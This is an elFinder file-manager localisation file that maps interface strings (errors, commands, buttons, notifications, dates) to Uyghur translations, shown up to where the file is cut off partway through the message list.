/**
 * ئ‍ۇيغۇرچە translation
 * @author تەرجىمە قىلغۇچى:  ئۆتكۈر بىز شىركىتى info@otkur.biz
 * @version 2022-03-03
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.ug_CN = {
		translator : 'تەرجىمە قىلغۇچى:  ئۆتكۈر بىز شىركىتى info@otkur.biz',
		language   : 'ئ‍ۇيغۇرچە',
		direction  : 'rtl',
		dateFormat : 'Y-m-d H:i', // will show like: 2022-03-03 16:56
		fancyDateFormat : '$1 H:i', // will show like: بۈگۈن 16:56
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220303-165611
		messages   : {
			'getShareText' : 'ھەمبەھىرلەش',
			'Editor ': 'كود تەھرىرلىگۈچى',

			/********************************** errors **********************************/
			'error'                : 'خاتالىق',
			'errUnknown'           : 'كۈتۈلمىگەن خاتالىقكەن.',
			'errUnknownCmd'        : 'كۈتۈلمىگەن بۇيرۇقكەن.',
			'errJqui'              : 'jQuery UI تەڭشىكى توغرا بولمىغان. چوقۇم Selectable، draggable، droppabl قاتارلىق بۆلەكلەر بولۇشى كېرەك.',
			'errNode'              : 'elFinder DOM ئېلىمىنتلىرىنى قۇرالىشى كېرەك.',
			'errURL'               : 'elFinder تەڭشىكى توغرا بولمىغان! URL تەڭشىكى يېزىلمىغان.',
			'errAccess'            : 'زىيارەت قىلىش چەكلەنگەن.',
			'errConnect'           : 'ئارقا سۇپىغا ئۇلاش مەغلۇپ بولدى..',
			'errAbort'             : 'ئارقا سۇپىغا توختىتىلدى.',
			'errTimeout'           : 'ئارقا سۇپىغا بەلگىلەنگەن ۋاقىتتا ئۇلىيالمىدى.',
			'errNotFound'          : 'ئارقا سۇپا تېپىلمىدى.',
			'errResponse'          : 'ئارقا سۇپىدىن توغرا بولمىغان ئىنكاس قايتتى.',
			'errConf'              : 'ئارقا سۇپا تەڭشىكى توغرا ئەمەس.',
			'errJSON'              : 'PHP JSON بۆلىكى قاچىلانمىغان.',
			'errNoVolumes'         : 'ئوقۇشقا بولىدىغان ھۈججەت خالتىسى يوق.',
			'errCmdParams'         : 'پارامېتىر خاتا، بۇيرۇق: "$1".',
			'errDataNotJSON'       : 'ئارقا سۇپا قايتۇرغان سانلىق مەلۇمات توغرا بولغان JSON ئەمەسكەن.',
			'errDataEmpty'         : 'ئارقا سۇپا قايتۇرغان سانلىق مەلۇمات قۇرۇقكەن.',
			'errCmdReq'            : 'ئارقا سۇپىدىكى بۇيرۇقنىڭ ئ‍سىمى تەمىنلىنىشى كېرەك.',
			'errOpen'              : '"$1"نى ئاچالمىدى.',
			'errNotFolder'         : 'ئوبىكىت مۇندەرىجە ئەمەسكەن.',
			'errNotFile'           : 'ئوبىكىت ھۈججەت ئەمەسكەن.',
			'errRead'              : '"$1"نى ئوقۇيالمىدى.',
			'errWrite'             : '"$1"نى يازالمىدى.',
			'errPerm'              : 'ھوقۇق يوق.',
			'errLocked'            : '"$1" تاقالغان,ئۆزگەرتەلمەيسىز.',
			'errExists'            : '"$1" ناملىق ھۈججەت باركەن.',
			'errInvName'           : 'توغرا بولمىغان ھۈججەت قىسقۇچ ئىسمى.',
			'errInvDirname'        : 'ھۆججەت قىسقۇچنىڭ ئىسمى ئىناۋەتسىز.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'ھۈججەت قىسقۇچنى تاپالمىدى.',
			'errFileNotFound'      : 'ھۈججەتنى تاپالمىدى.',
			'errTrgFolderNotFound' : '"$1" ناملىق ھۈججەت قىسقۇچنى تاپالمىدى.',
			'errPopup'             : 'سەكرەپ چىققان يېڭى بەتنى تور كۆرگۈچ كۆرسەتمىدى، ئۈستىدىكى ئەسكەرتىشتىن تور كۆرگۈچنى كۆرسىتىشكە تەڭشەڭ.',
			'errMkdir'             : '"$1" ناملىق ھۈججەت قىسقۇچنى قۇرالمىدى.',
			'errMkfile'            : '"$1" ناملىق ھۈججەتنى قۇرالمىدى.',
			'errRename'            : '"$1" ناملىق ھۈججەتنىڭ ئىسمىنى يېڭىلاش مەغلۇپ بولدى.',
			'errCopyFrom'          : ' "$1" ناملىق ئورۇندىن ھۈججەت كۆچۈرۈش چەكلەنگەن.',
			'errCopyTo'            : '"$1" ناملىق ئورۇنغا ھۈججەت كۆچۈرۈش چەكلەنگەن.',
			'errMkOutLink'         : 'ئاۋاز يىلتىزىنىڭ سىرتىغا ئۇلىنىش قۇرالمىدى.', // from v2.1 added 03.10.2015
			'errUpload'            : 'يۈكلەشتە خاتالىق كۆرۈلدى.',  // old name - errUploadCommon
			'errUploadFile'        : '"$1" ناملىق ھۈججەتنى يۈكلەشتە خاتالىق كۆرۈلدى.', // old name - errUpload
			'errUploadNoFiles'     : 'يۈكلىمەكچى بولغان ھۈججەت تېپىلمىدى.',
			'errUploadTotalSize'   : 'سانلىق مەلۇمات چوڭلىقى چەكلىمىدىن ئېشىپ كەتكەن..', // old name - errMaxSize
			'errUploadFileSize'    : 'ھۈججەت چوڭلىقى چەكلىمىدىن ئېشىپ كەتكەن..', //  old name - errFileMaxSize
			'errUploadMime'        : 'چەكلەنگەن ھۈججەت شەكلى.',
			'errUploadTransfer'    : '"$1" ناملىق ھۈججەتنى يوللاشتا خاتالىق كۆرۈلدى.',
			'errUploadTemp'        : 'يوللاش ئۈچۈن ۋاقىتلىق ھۆججەت ھاسىل قىلالمىدى.', // from v2.1 added 26.09.2015
			'errNotReplace'        : '"$1" ناملىق ھۈججەت باركەن، ئالماشتۇرۇشقا بولمايدۇ.', // new
			'errReplace'           : '"$1" ناملىق ھۈججەتنى ئالماشتۇرۇش مەغلۇپ بولدى.',
			'errSave'              : '"$1" ناملىق ھۈججەتنى ساقلاش مەغلۇپ بولدى.',
			'errCopy'              : '"$1" ناملىق ھۈججەتنى كۆچۈرۈش مەغلۇپ بولدى.',
			'errMove'              : '"$1" ناملىق ھۈججەتنى يۆتكەش مەغلۇپ بولدى.',
			'errCopyInItself'      : '"$1" ناملىق ھۈججەتنى ئەسلى ئورنىغا يۆتكەش مەغلۇپ بولدى.',
			'errRm'                : '"$1" ناملىق ھۈججەتنى ئۆچۈرۈش مەغلۇپ بولدى.',
			'errTrash'             : 'ئەخلەت ساندۇقىغا كىرەلمىدى.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'ئەسلى ھۈججەتنى ئۆچۈرۈش مەغلۇپ بولدى.',
			'errExtract'           : ' "$1" ناملىق مەلۇماتتىن ھۈججەت ئايرىش مەغلۇپ بولدى..',
			'errArchive'           : 'پىرىسلانغان ھۈججەت ھاسىللاش مەغلۇپ بولدى.',
			'errArcType'           : 'بۇ خىل پىرىسلانغان ھۈججەت شەكلىنى سىستېما بىر تەرەپ قىلالمىدى.',
			'errNoArchive'         : 'ھۈججەت پىرىسلانغان ھۈججەت ئەمەس، ياكى توغرا پىرىسلانمىغان.',
			'errCmdNoSupport'      : 'بۇ خىل بۇيرۇقنى بىر تەرەپ قىلالمىدى.',
			'errReplByChild'       : '“$1” ناملىق ھۈججەت قىسقۇچنى ئالماشۇتۇرۇشقا بولمايدۇ.',
			'errArcSymlinks'       : 'بىخەتەرلىك ئۈچۈن بۇ مەشغۇلات ئەمەلدىن قالدۇرۇلدى..', // edited 24.06.2012
			'errArcMaxSize'        : 'پىرىسلانغان ھۈججەتنىڭ چوڭلىقى چەكلىمىدىن ئېشىپ كەنكەن.',
			'errResize'            : ' "$1" چوڭلۇقنى تەڭشەشكە بولمىدى.',
			'errResizeDegree'      : 'توغرا بولمىغان پىقىرىتىش گىرادۇسى',  // added 7.3.2013
			'errResizeRotate'      : 'رەسىمنى پىقىرىتىشقا بولمىدى.',  // added 7.3.2013
			'errResizeSize'        : 'توغرا بولمىغان رەسىم چوڭلىقى.',  // added 7.3.2013
			'errResizeNoChange'    : 'رەسىم چوڭلىقى ئۆزگەرمىگەن.',  // added 7.3.2013
			'errUsupportType'      : 'قوللىمايدىغان ھۈججەت شەكلى.',
			'errNotUTF8Content'    : '"$1" ناملىق ھۈججەتنىڭ كودى  UTF-8ئەمەسكەن،  تەھرىرلىگىلى بولمايدۇ.',  // added 9.11.2011
			'errNetMount'          : ' "$1" نى يۈكلەشتە خاتلىق يۈز بەردى..', // added 17.04.2012
			'errNetMountNoDriver'  : 'بۇ خىل پروتوكول قوللانمىدى..',     // added 17.04.2012
			'errNetMountFailed'    : 'يۈكلەش مەغلۇپ بولدى.',         // added 17.04.2012
			'errNetMountHostReq'   : 'مۇلازىمىتىرنى كۆرسىتىپ بېرىڭ.', // added 18.04.2012
			'errSessionExpires'    : 'سىزنىڭ ھەرىكەتسىزلىكىڭىز سەۋەبىدىن ۋاقتىڭىز توشتى.',
			'errCreatingTempDir'   : 'ۋاقىتلىق مۇندەرىجە قۇرالمىدى: "$ 1"',
			'errFtpDownloadFile'   : 'FTP دىن ھۆججەت چۈشۈرۈشكە ئامالسىز: "$ 1"',
			'errFtpUploadFile'     : 'FTP غا ھۆججەت يۈكلىيەلمىدى: "$ 1"',
			'errFtpMkdir'          : 'FTP دا يىراقتىن مۇندەرىجە قۇرالمىدى: "$ 1"',
			'errArchiveExec'       : 'ھۆججەتلەرنى ئارخىپلاشتۇرغاندا خاتالىق: "$ 1"',
			'errExtractExec'       : 'ھۆججەتلەرنى چىقىرىشتا خاتالىق: "$ 1"',
			'errNetUnMount'        : 'ساناقسىز.', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'UTF-8 غا ئايلاندۇرغىلى بولمايدۇ', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'ئەگەر ھۆججەت قىسقۇچنى يۈكلىمەكچى بولسىڭىز ، زامانىۋى توركۆرگۈنى سىناپ بېقىڭ.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : '«$ 1» نى ئىزدەۋاتقاندا ۋاقتى ئۆتتى. ئىزدەش نەتىجىسى قىسمەن.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'قايتا ھوقۇق بېرىش تەلەپ قىلىنىدۇ.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'تاللىغىلى بولىدىغان تۈرلەرنىڭ ئەڭ كۆپ سانى 1 دوللار.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'ئەخلەت ساندۇقىدىن ئەسلىگە كەلتۈرگىلى بولمايدۇ. ئەسلىگە كەلتۈرۈش مەنزىلىنى ئېنىقلىيالمىدى.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'تەھرىرلىگۈچ بۇ ھۆججەت تىپىغا تېپىلمىدى.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'مۇلازىمېتىر تەرەپتە خاتالىق كۆرۈلدى.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : '"$ 1" ھۆججەت قىسقۇچىنى بوشاتقىلى بولمايدۇ.', // from v2.1.25 added 22.6.2017
			'moreErrors'           : 'يەنە 1 دوللار خاتالىق بار.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'بىرلا ۋاقىتتا $ 1 ھۆججەت قىسقۇچ قۇرالايسىز.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'پىرىسلاش',
			'cmdback'      : 'قايتىش',
			'cmdcopy'      : 'كۆچۈرۈش',
			'cmdcut'       : 'كېسىش',
			'cmddownload'  : 'چۈشۈرۈش',
			'cmdduplicate' : 'نۇسخىلاش',
			'cmdedit'      : 'تەھرىرلەش',
			'cmdextract'   : 'پىرىستىن ھۈججەت چىقىرىش',
			'cmdforward'   : 'ئ‍الدىغا مېڭىش',
			'cmdgetfile'   : 'تاللاش',
			'cmdhelp'      : 'ئەپ ھەققىدە',
			'cmdhome'      : 'باش بەت',
			'cmdinfo'      : 'ئۇچۇرلىرى',
			'cmdmkdir'     : 'يېڭى ھۈججەت قىسقۇچ',
			'cmdmkdirin'   : 'يېڭى ھۆججەت قىسقۇچقا', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'يېڭى ھۈججەت',
			'cmdopen'      : 'ئېچىش',
			'cmdpaste'     : 'چاپلاش',
			'cmdquicklook' : 'كۆرۈش',
			'cmdreload'    : 'يېڭىلاش',
			'cmdrename'    : 'نام يېڭىلاش',
			'cmdrm'        : 'ئۆچۈرۈش',
			'cmdtrash'     : 'ئەخلەت ساندۇقىغا', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'ئەسلىگە كەلتۈرۈش', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'ھۈججەت ئىزدەش',
			'cmdup'        : 'ئالدىنقى مۇندەرىجىگە بېرىش',
			'cmdupload'    : 'يۈكلەش',
			'cmdview'      : 'كۆرۈش',
			'cmdresize'    : 'چوڭلىقىنى تەڭشەش',
			'cmdsort'      : 'تەرتىپ',
			'cmdnetmount'  : 'توردىن قوشۇش', // added 18.04.2012
			'cmdnetunmount': 'Unmount', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'جايلارغا', // added 28.12.2014
			'cmdchmod'     : 'ھالەتنى ئۆزگەرتىش', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'ھۆججەت قىسقۇچنى ئېچىڭ', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'ستون كەڭلىكىنى ئەسلىگە كەلتۈرۈڭ', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'تولۇق ئېكران', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'يۆتكەڭ', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'قىسقۇچنى بوش قويۇڭ', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'ئەمەلدىن قالدۇرۇش', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'Redo', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'مايىللىق', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'ھەممىنى تاللاڭ', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'ھېچقايسىسىنى تاللىماڭ', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'تەتۈر تاللاش', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'يېڭى كۆزنەكتە ئېچىڭ', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'يوشۇرۇش (مايىللىق)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'تاقاش',
			'btnSave'   : 'ساقلاش',
			'btnRm'     : 'ئۆچۈرۈش',
			'btnApply'  : 'ئىشلىتىش',
			'btnCancel' : 'بېكارلاش',
			'btnNo'     : 'ياق',
			'btnYes'    : 'ھەئە',
			'btnMount'  : 'يۈكلەش',  // added 18.04.2012
			'btnApprove': 'Goto $ 1 & تەستىق', // from v2.1 added 26.04.2012
			'btnUnmount': 'Unmount', // from v2.1 added 30.04.2012
			'btnConv'   : 'ئايلاندۇرۇش', // from v2.1 added 08.04.2014
			'btnCwd'    : 'بۇ يەردە',      // from v2.1 added 22.5.2015
			'btnVolume' : 'ھەجىم',    // from v2.1 added 22.5.2015
			'btnAll'    : 'ھەممىسى',       // from v2.1 added 22.5.2015
			'btnMime'   : 'MIME تىپى', // from v2.1 added 22.5.2015
			'btnFileName':'ھۆججەت ئىسمى',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'ساقلاش ۋە تاقاش', // from v2.1 added 12.6.2015
			'btnBackup' : 'زاپاسلاش', // fromv2.1 added 28.11.2015
			'btnRename'    : 'ئىسىمنى ئۆزگەرتىش',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'Rename(All)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'ئالدىنقى ($ 1 / $ 2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'كېيىنكى ($ 1 / $ 2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'Save As', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'قىسقۇچنى ئېچىش',
			'ntffile'     : 'ھۈججەتنى ئېچىش',
			'ntfreload'   : 'يېڭىلاش',
			'ntfmkdir'    : 'قىسقۇچ قۇرۇش',
			'ntfmkfile'   : 'ھۈججەت قۇرۇش',
			'ntfrm'       : 'ئۆچۈرۈش',
			'ntfcopy'     : 'كۆچۈرۈش',
			'ntfmove'     : 'يۆتكەش',
			'ntfprepare'  : 'كۆچۈرۈش تەييارلىقى',
			'ntfrename'   : 'نام يېڭىلاش',
			'ntfupload'   : 'يۈكلەش',
			'ntfdownload' : 'چۈشۈرۈش',
			'ntfsave'     : 'ساقلاش',
			'ntfarchive'  : 'پىرىسلاش',
			'ntfextract'  : 'پىرىستىن يېشىش',
			'ntfsearch'   : 'ئىزدەش',
			'ntfresize'   : 'چوڭلىقى ئۆزگەرتىلىۋاتىدۇ',
			'ntfsmth'     : 'ئالدىراش >_<',
			'ntfloadimg'  : 'رەسىم ئېچىلىۋاتىدۇ',
			'ntfnetmount' : 'تور ھۈججىتى يۈكلىنىۋاتىدۇ', // added 18.04.2012
			'ntfnetunmount': 'تور ئاۋازىنى ئۆچۈرۈۋېتىش', // from v2.1 added 30.04.2012
			'ntfdim'      : 'رەسىم ئۆلچىمىگە ئېرىشىش', // added 20.05.2013
			'ntfreaddir'  : 'قىسقۇچ ئۇچۇرلىرىنى ئوقۇش', // from v2.1 added 01.07.2013
			'ntfurl'      : 'ئۇلىنىش ئادرېسىغا ئېرىشىش', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'ھۆججەت ھالىتىنى ئۆزگەرتىش', // from v2.1 added 20.6.2015
			'ntfpreupload': 'يۈكلەش ھۆججەت نامىنى دەلىللەش', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'چۈشۈرۈش ئۈچۈن ھۆججەت قۇرۇش', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'يول ئۇچۇرىغا ئېرىشىش', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'يۈكلەنگەن ھۆججەتنى بىر تەرەپ قىلىش', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'ئەخلەت ساندۇقىغا تاشلاش', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'ئەخلەت ساندۇقىدىن ئەسلىگە كەلتۈرۈش', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'نىشان ھۆججەت قىسقۇچىنى تەكشۈرۈش', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'ئالدىنقى مەشغۇلاتنى بىكار قىلىش', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'ئىلگىرىكى ئەمەلدىن قالدۇرۇش', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'مەزمۇننى تەكشۈرۈش', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'ئەخلەت ساندۇقى', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'ئېنىق ئەمەس',
			'Today'       : 'بۈگۈن',
			'Yesterday'   : 'تۆنۈگۈن',
			'msJan'       : '1-ئاي',
			'msFeb'       : '2-ئاي',
			'msMar'       : '3-ئاي',
			'msApr'       : '4-ئاي',
			'msMay'       : '5-ئاي',
			'msJun'       : '6-ئاي',
			'msJul'       : '7-ئاي',
			'msAug'       : '8-ئاي',
			'msSep'       : '9-ئ‍اي',
			'msOct'       : '10-ئاي',
			'msNov'       : '11-ئاي',
			'msDec'       : '12-ئاي',
			'January'     : '1-ئاي',
			'February'    : '2-ئاي',
			'March'       : '3-ئاي',
			'April'       : '4-ئاي',
			'May'         : '5-ئاي',
			'June'        : '6-ئاي',
			'July'        : '7-ئاي',
			'August'      : '8-ئاي',
			'September'   : '9-ئاي',
			'October'     : '10-ئاي',
			'November'    : '11-ئاي',
			'December'    : '12-ئاي',
			'Sunday'      : 'يەكشەنبە',
			'Monday'      : 'دۈشەنبە',
			'Tuesday'     : 'سەيشەنبە',
			'Wednesday'   : 'چارشەنبە',
			'Thursday'    : 'پەيشەنبە',
			'Friday'      : 'جۈمە',
			'Saturday'    : 'شەنبە',
			'Sun'         : 'يە',
			'Mon'         : 'دۈ',
			'Tue'         : 'سە',
			'Wed'         : 'چا',
			'Thu'         : 'پە',
			'Fri'         : 'جۈ',
			'Sat'         : 'شە',

			/******************************** sort variants ********************************/
			'sortname'          : 'نامى ',
			'sortkind'          : 'شەكلى ',
			'sortsize'          : 'چوڭلىقى',
			'sortdate'          : 'ۋاقتى',
			'sortFoldersFirst'  : 'قىسقۇچلار باشتا',
			'sortperm'          : 'رۇخسەت بىلەن', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'by mode',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'ئىگىسى تەرىپىدىن',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'گۇرۇپپا بويىچە',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'Treeview',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'يېڭى ھۆججەت.txt', // added 10.11.2015
			'untitled folder'   : 'يېڭى ھۆججەت قىسقۇچ',   // added 10.11.2015
			'Archive'           : 'يېڭى ئارخېۋى',  // from v2.1 added 10.11.2015
			'untitled file'     :'يېڭىھۆججەت.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: ھۆججەت',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'مۇقىملاشتۇرۇڭ',
			'confirmRm'       : 'راستىنلا ئۆچۈرەمسىز?<br/>كەينىگە قايتۇرغىلى بولمايدۇ!',
			'confirmRepl'     : 'ھازىرقى ھۈججەت بىلەن كونىسىنى ئالماشتۇرامسىز?',
			'confirmRest'     : 'مەۋجۇت نەرسىنى ئەخلەت ساندۇقىغا ئالماشتۇرۇڭ؟', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'UTF-8 دا ئەمەس <br/> UTF-8 غا ئايلاندۇرامسىز؟ <br/> مەزمۇن ئۆزگەرتىلگەندىن كېيىن تېجەش ئارقىلىق UTF-8 غا ئايلىنىدۇ.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'بۇ ھۆججەتنىڭ ھەرپ-بەلگە كودلىرىنى بايقىغىلى بولمايدۇ. ئۇنى تەھرىرلەش ئۈچۈن UTF-8 غا ۋاقىتلىق ئۆزگەرتىش كېرەك. <br/> بۇ ھۆججەتنىڭ ھەرپ-بەلگە كودلىرىنى تاللاڭ.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'ئۇ ئۆزگەرتىلدى. <br/> ئۆزگەرتىشنى ساقلىمىسىڭىز خىزمەتتىن ئايرىلىدۇ.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'نەرسىلەرنى ئەخلەت ساندۇقىغا يۆتكىمەكچىمۇ؟', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'تۈرلەرنى «$ 1» غا يۆتكىمەكچىمۇ؟', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'ھەممىسىگە ئىشلىتىش',
			'name'            : 'نامى',
			'size'            : 'چوڭلىقى',
			'perms'           : 'ھوقۇق',
			'modify'          : 'ئۆزگەرگەن ۋاقتى',
			'kind'            : 'تۈرى',
			'read'            : 'ئوقۇش',
			'write'           : 'يېزىش',
			'noaccess'        : 'ھوقۇق يوق',
			'and'             : 'ھەم',
			'unknown'         : 'ئېنىق ئەمەس',
			'selectall'       : 'ھەممىنى تاللاش',
			'selectfiles'     : 'تاللاش',
			'selectffile'     : 'بىرىنچىسىنى تاللاش',
			'selectlfile'     : 'ئەڭ ئاخىرقىسىنى تاللاش',
			'viewlist'        : 'جەدۋەللىك كۆرىنىشى',
			'viewicons'       : 'رەسىملىك كۆرىنىشى',
			'viewSmall'       : 'كىچىك سىنبەلگىلەر', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'ئوتتۇرا سىنبەلگىلەر', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'چوڭ سىنبەلگىلەر', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'قوشۇمچە چوڭ سىنبەلگىلەر', // from v2.1.39 added 22.5.2018
			'places'          : 'ئورنى',
			'calc'            : 'ھېسابلاش',
			'path'            : 'ئورنى',
			'aliasfor'        : 'باشقا نامى',
			'locked'          : 'تاقالغان',
			'dim'             : 'چوڭلىقى',
			'files'           : 'ھۈججەت',
			'folders'         : 'قىسقۇچ',
			'items'           : 'تۈرلەر',
			'yes'             : 'ھەئە',
			'no'              : 'ياق',
			'link'            : 'ئۇلىنىش',
			'searcresult'     : 'ئىزدەش نەتىجىسى',
			'selected'        : 'تاللانغان تۈرلەر',
			'about'           : 'چۈشەنچە',
			'shortcuts'       : 'تېز كونۇپكىلار',
			'help'            : 'ياردەم',
			'webfm'           : 'تور ھۈججەتلىرىنى باشقۇرۇش',
			'ver'             : 'نەشرى',
			'protocolver'     : 'پروتوكول نەشرى',
			'homepage'        : 'تۈر باش بېتى',
			'docs'            : 'ھۈججەت',
			'github'          : 'Fork us on Github',
			'twitter'         : 'Follow us on twitter',
			'facebook'        : 'Join us on facebook',
			'team'            : 'گۇرۇپپا',
			'chiefdev'        : 'باش پىروگراممىر',
			'developer'       : 'پىروگراممىر',
			'contributor'     : 'تۆھپىكار',
			'maintainer'      : 'ئاسرىغۇچى',
			'translator'      : 'تەرجىمان',
			'icons'           : 'سىنبەلگە',
			'dontforget'      : 'تەرىڭىزنى سۈرتىدىغان قولياغلىقىڭىزنى ئۇنۇتماڭ جۇمۇ',
			'shortcutsof'     : 'تېز كونۇپكىلار چەكلەنگەن',
			'dropFiles'       : 'ھۈججەتنى موشۇ يەرگە تاشلاڭ',
			'or'              : 'ياكى',
			'selectForUpload' : 'يۈكلىمەكچى بولغان ھۈججەتنى تاللاڭ',
			'moveFiles'       : 'يۆتكەش',
			'copyFiles'       : 'كۆچۈرۈش',
			'restoreFiles'    : 'تۈرلەرنى ئەسلىگە كەلتۈرۈش', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'ھۈججەتلەرنى ئۆچۈرۈش',
			'aspectRatio'     : 'نىسبىتىنى ساقلاش',
			'scale'           : 'نىسبىتى',
			'width'           : 'ئۇزۇنلىقى',
			'height'          : 'ئىگىزلىكى',
			'resize'          : 'چوڭلىقىنى تەڭشەش',
			'crop'            : 'كېسىش',
			'rotate'          : 'پىقىرىتىش',
			'rotate-cw'       : 'سائەت ئىستىرىلكىسى بويىچە 90 گىرادۇس پىقىرىتىش',
			'rotate-ccw'      : 'سائەت ئىستىرىلكىسىنى تەتۈر يۆنىلىشى بويىچە 90گىرادۇس پىقىرىتىش',
			'degree'          : 'گىرادۇس',
			'netMountDialogTitle' : 'تور ئاۋازى', // added 18.04.2012
			'protocol'            : 'پىروتوكڭل', // added 18.04.2012
			'host'                : 'مۇلازىمىتىر', // added 18.04.2012
			'port'                : 'پورت', // added 18.04.2012
			'user'                : 'ئەزا', // added 18.04.2012
			'pass'                : 'ئىم', // added 18.04.2012
			'confirmUnmount'      : 'سىز $ 1 نى ھېسابلىمايسىز؟',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'توركۆرگۈدىن ھۆججەتلەرنى تاشلاش ياكى چاپلاش', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'ھۆججەتلەرنى بۇ يەرگە تاشلاڭ ، URL ياكى رەسىملەرنى چاپلاڭ', // from v2.1 added 07.04.2014
			'encoding'        : 'كودلاش', // from v2.1 added 19.12.2014
			'locale'          : 'Locale',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'نىشان: $ 1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'كىرگۈزۈش MIME تىپى ئارقىلىق ئىزدەش', // from v2.1 added 22.5.2015
			'owner'           : 'ئىگىسى', // from v2.1 added 20.6.2015
			'group'           : 'گۇرۇپپا', // from v2.1 added 20.6.2015
			'other'           : 'باشقىلىرى', // from v2.1 added 20.6.2015
			'execute'         : 'ئىجرا قىلىڭ', // from v2.1 added 20.6.2015
			'perm'            : 'ئىجازەت', // from v2.1 added 20.6.2015
			'mode'            : 'Mode', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'ھۆججەت قىسقۇچ قۇرۇق', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'ھۆججەت قىسقۇچ قۇرۇق \\ تۈر قوشۇش ئۈچۈن تاشلاش', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'ھۆججەت قىسقۇچ قۇرۇق \\ تۈر قوشۇش ئۈچۈن ئۇزۇن چېكىش', // from v2.1.6 added 30.12.2015
			'quality'         : 'سۈپەت', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'ئاپتوماتىك ماسقەدەملەش',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'يۆتكەڭ',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'URL ئۇلىنىشىغا ئېرىشىڭ', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'تاللانغان تۈرلەر ($ 1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'ھۆججەت قىسقۇچ كىملىكى', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'تورسىز زىيارەت قىلىشقا يول قويۇڭ', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'قايتا دەلىللەش', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'ھازىر يۈكلەۋاتىدۇ ...', // from v2.1.12 added 4.26.2016
